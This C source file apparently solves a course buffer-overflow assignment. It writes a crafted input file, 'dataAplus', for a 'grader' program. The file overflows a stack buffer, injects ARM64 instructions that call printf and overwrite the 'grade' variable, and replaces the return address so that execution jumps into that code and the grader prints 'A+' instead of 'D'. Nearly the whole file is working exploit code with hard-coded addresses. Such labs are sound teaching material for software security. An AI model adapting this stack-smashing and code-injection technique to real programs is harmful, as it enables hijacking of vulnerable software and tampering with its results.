/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish K (Modified by [Your Name])                          */
/*--------------------------------------------------------------------*/

/*
  Produces a file called "dataAplus" that, when provided as input to 
  the grader program, causes the grader to print "A+" instead of "D".

  This is achieved by:
  1. Writing a chosen name followed by a null terminator.
  2. Overflowing the stack with padding bytes.
  3. Injecting an 'A' character along with alignment bytes.
  4. Writing machine instructions into memory (via the buffer overrun):
     - Load and print 'A' using printf.
     - Replace 'D' with '+' in the 'grade' variable.
     - Branch back to the main function to finalize printing "A+".
  5. Overwriting the return address to execute our injected instructions.
*/

/*
  Interactive behavior of main:
  - Does not accept command-line arguments.
  - Does not read from stdin or any other streams.
  - Does not write to stdout or stderr.
  - Writes crafted bytes into "dataAplus".
  - Returns 0 on success.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* Constants derived from analysis */
enum {
    NAME_LENGTH         = 9,       /* Length of "AnishKKat" without the null terminator */
    NULL_TERM_COUNT     = 1,       /* One null terminator after the name */
    PADDING_COUNT       = 10,      /* Number of '0' chars to overflow the stack */
    ALIGN_COUNT         = 3,       /* Number of null bytes for alignment after 'A' */
    A_CHAR_ADDR         = 0x42006c,/* Address in bss where 'A' will be located */
    START_INSTR_ADDR    = 0x420070,/* Address where injected instructions begin */
    PRINTF_ADDR         = 0x400690,/* Address of printf function */
    GRADE_ADDR          = 0x420044,/* Address of 'grade' variable in data */
    BRANCH_BACK_ADDR    = 0x40089c,/* Address in main to branch back to */
    BL_INSTR_SHIFT      = 2,
    BL_INSTR_MASK       = 0x03FFFFFF
};

/* 
   Generates a BL (branch with link) instruction to call a function
   at ulTargetAddr from the instruction at ulCurrentAddr.
*/
static unsigned int GenerateBL(unsigned long ulTargetAddr,
                              unsigned long ulCurrentAddr) {
    unsigned int uiInstr = 0x94000000;
    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> BL_INSTR_SHIFT);
    uiInstr |= (uiOffset & BL_INSTR_MASK);
    return uiInstr;
}

int main(void) {
    /* The chosen name to be placed in the bss array. */
    const char *pcName = "AnishKKat";

    /* Variables for file writing and instruction generation */
    FILE *fp;
    int i;
    unsigned long ulNewReturnAddress;
    unsigned int uiInstrAdrA, uiInstrCallPrintf;
    unsigned int uiInstrMovPlus, uiInstrAdrGrade;
    unsigned int uiInstrStrbPlus, uiInstrBranchBack;

    /* Open "dataAplus" file for writing */
    fp = fopen("dataAplus", "w");
    if (!fp) return 1;

    /* Write the chosen name followed by a null terminator */
    fwrite(pcName, 1, NAME_LENGTH, fp);
    fputc('\0', fp);

    /* Write padding '0' characters to overflow the stack */
    for (i = 0; i < PADDING_COUNT; i++) {
        fputc('0', fp);
    }

    /* Write 'A' and alignment null bytes */
    fputc('A', fp);
    for (i = 0; i < ALIGN_COUNT; i++) {
        fputc('\0', fp);
    }

    /*
      Generate the necessary instructions:
      1. Load the address of 'A' into x0 (ADR).
      2. Branch with link to printf (BL).
      3. Move '+' into w0 (MOV).
      4. Load address of grade variable into x1 (ADR).
      5. Store '+' at the grade variable (STRB).
      6. Branch back to main's printing sequence (B).
    */

    /* ADR x0, A_CHAR_ADDR */
    uiInstrAdrA       = MiniAssembler_adr(0, A_CHAR_ADDR, START_INSTR_ADDR);

    /* BL to printf at PRINTF_ADDR */
    uiInstrCallPrintf = GenerateBL(PRINTF_ADDR, START_INSTR_ADDR + 4);

    /* MOV w0, '+' */
    uiInstrMovPlus    = MiniAssembler_mov(0, '+');

    /* ADR x1, GRADE_ADDR */
    uiInstrAdrGrade   = MiniAssembler_adr(1, GRADE_ADDR, START_INSTR_ADDR + 12);

    /* STRB w0, [x1] */
    uiInstrStrbPlus   = MiniAssembler_strb(0, 1);

    /* B BRANCH_BACK_ADDR */
    uiInstrBranchBack = MiniAssembler_b(BRANCH_BACK_ADDR, START_INSTR_ADDR + 20);

    /*
      Write out all the generated instructions in sequence.
      The order is crucial to preserve the intended behavior.
    */
    fwrite(&uiInstrAdrA,       sizeof(unsigned int), 1, fp);
    fwrite(&uiInstrCallPrintf, sizeof(unsigned int), 1, fp);
    fwrite(&uiInstrMovPlus,    sizeof(unsigned int), 1, fp);
    fwrite(&uiInstrAdrGrade,   sizeof(unsigned int), 1, fp);
    fwrite(&uiInstrStrbPlus,   sizeof(unsigned int), 1, fp);
    fwrite(&uiInstrBranchBack, sizeof(unsigned int), 1, fp);

    /* Overwrite the stored return address so execution jumps into our instructions */
    ulNewReturnAddress = START_INSTR_ADDR;
    fwrite(&ulNewReturnAddress, sizeof(unsigned long), 1, fp);

    fclose(fp);
    return 0;
}